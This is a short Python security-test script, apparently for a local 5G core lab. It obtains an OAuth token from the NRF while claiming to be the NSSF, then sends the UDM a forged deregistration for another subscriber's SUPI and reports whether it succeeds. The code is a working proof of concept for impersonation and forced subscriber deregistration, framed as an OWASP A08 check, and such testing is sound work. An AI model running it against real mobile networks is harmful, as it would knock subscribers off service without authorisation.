import requests
import urllib3
import json

#--- Configurações de Ambiente (Valores da sua configuração) ---
NF_CONFIG = {
    "NRF_IP": "127.0.0.10",
    "NRF_PORT": 8000,
    "UDM_IP": "127.0.0.3",
    "UDM_PORT": 8000,
    "SUPI_2": "208930000000002"
}

UDM_API_URL_BASE = f"http://{NF_CONFIG['UDM_IP']}:{NF_CONFIG['UDM_PORT']}/nudm-uecm/v1/ues"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_access_token():
    """Tenta obter um token de acesso de uma NF."""
    auth_url = f"http://{NF_CONFIG['NRF_IP']}:{NF_CONFIG['NRF_PORT']}/nnrf-nfm/v1/oauth2/token"
    auth_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    auth_data = "grant_type=client_credentials&client_id=NSSF"
    try:
        response = requests.post(auth_url, headers=auth_headers, data=auth_data, timeout=5)
        response.raise_for_status()
        return response.json().get("access_token")
    except (requests.exceptions.RequestException, KeyError) as e:
        return None

def test_data_integrity():
    print("=" * 50)
    print("A08: Testando Data Integrity Failures and Forgery")
    print("=" * 50)

    token = get_access_token()
    if not token:
        print("[-] Não foi possível obter o token para o teste.")
        return

    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
    target_supi = NF_CONFIG['SUPI_2']
    api_url = f"{UDM_API_URL_BASE}/imsi-{target_supi}/deregistrations"
    payload = {"deregisterReason": "UE_is_out_of_coverage"}

    try:
        response = requests.post(api_url, headers=headers, data=json.dumps(payload), timeout=5)
        if response.status_code == 204:
            print("[!!!] VULNERABILIDADE DETECTADA: Manipulação de SUPI bem-sucedida!")
        elif response.status_code in [401, 403]:
            print("[+] Manipulação de SUPI falhou. Acesso foi negado.")
        else:
            print(f"[-] Resposta inesperada. Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Erro ao tentar manipular o SUPI: {e}")

if __name__ == "__main__":
    test_data_integrity()